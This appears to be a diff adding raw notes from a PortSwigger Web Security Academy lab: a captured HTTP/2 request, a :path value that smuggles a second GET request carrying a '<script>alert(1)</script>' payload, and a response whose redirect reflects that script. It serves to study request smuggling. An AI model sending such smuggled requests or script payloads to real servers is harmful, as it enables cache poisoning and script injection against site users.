@@ -1,0 +1,41 @@
+Request
+GET / HTTP/2
+Host: <lab-host>.web-security-academy.net
+Cookie: session=<redacted>
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Referer: https://portswigger.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+
+
+:Path Value
+/ HTTP/1.1
+Host: <lab-host>.web-security-academy.net
+
+GET /resources?<script>alert(1)</script>AAAAAAA..... HTTP/1.1
+Foo: bar
+
+
+Response
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=<redacted>; Secure; HttpOnly; SameSite=None
+Content-Length: 8687
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+
+HTTP/1.1 302 Found
+Location: /resources/?<script>alert(1)</script>AAAAAAAAAAAAA.....
